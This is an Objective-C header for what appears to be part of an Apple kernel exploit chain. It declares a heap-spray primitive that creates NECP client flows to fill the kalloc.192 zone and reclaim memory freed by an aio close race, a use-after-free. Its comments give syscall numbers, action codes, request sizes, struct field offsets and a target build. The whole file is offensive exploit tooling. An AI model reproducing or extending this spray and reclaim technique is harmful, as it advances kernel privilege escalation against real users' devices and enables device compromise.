//
//  P179NecpFlowSpray.h — the NECP client-flow spray primitive (kalloc.192).
//
//  Findings 2026-11-21_necp_client_flow_reclaim_path.md (23F77, every offset
//  kernel-verified): necp_client_flow (kt 0xb0) shares the 192-class kalloc
//  bucket with aio_workq_entry (0xb8) — the reclaim vehicle for the aio
//  close-race free. The path:
//     necp_open(463, pid)                            -> the necp fd (client
//     necp_client_action(464, ADD=1, params>=0x801)     mode, plain app —
//     necp_client_action(464, ADD_FLOW=0x11, req>=0xf1) no entitlement on
//                                                       the flow path)
//  PANIC-FREE: plain syscalls creating legitimate kernel objects (freed at
//  fd close). The shape matrix on the first tap is the layout receipt.
//

#import <Foundation/Foundation.h>
#import <stdint.h>
#import <stddef.h>

#define NECP179_FLOW_REQ_SIZE 0xf1u   /* the default_add_request (the 0xf1 law) */
#define NECP179_ADD_PARAMS_SIZE 0x900u /* >= the 0x801 ADD minimum */

@interface P179NecpFlowSpray : NSObject
+ (NSString *)tap NS_SWIFT_NAME(tap());
@end

/* The C ABI (shared with the T8 sequencer — plain functions, no ObjC state).
   The syscall ABI (findings §4):
     necp_client_action(a0=fd, a1=(client_id<<32)|action, a2=cid_ptr,
                        a3=0x10, a4=buffer, a5=size)                                  */

/* necp_open(463) — client mode. pid 0 first (self), getpid() fallback. */
int necp179_open_fd(void);

/* ADD (action 1): a zeroed parameters blob (>= 0x801). The kernel generates
   the 16-byte client uuid and copies it OUT to cid_out. Returns 0 on success. */
int necp179_add_client(int fd, uint8_t cid_out[16]);

/* Fill the 0xf1-byte default_add_request: the local sockaddr at +0x10 (16B,
   unique per call = the dedup law), flags at +0x20 (bit6 = request-local),
   interface count 0 at +0x22. */
void necp179_req_fill(uint8_t *req, const uint8_t sa[16], uint16_t flags);

/* Build a 16-byte sockaddr_in into sa: sin_len=16, AF_INET, the dotted quad
   a.b.c.d, port (host order). The uniqueness source for the spray. */
void necp179_sa_fill(uint8_t sa[16], uint8_t a, uint8_t b, uint8_t c, uint8_t d,
                     uint16_t port);

/* ADD_FLOW (action 0x11) with a caller-built request (T8's pre-staged
   battery path — no per-call build cost on the spray thread). */
int necp179_add_flow_req(int fd, const uint8_t cid[16], const uint8_t *req,
                         size_t reqlen);

/* ADD_FLOW (action 0x11) with an inline-built request (the shape matrix). */
int necp179_add_flow(int fd, const uint8_t cid[16], const uint8_t sa[16],
                     uint16_t flags);
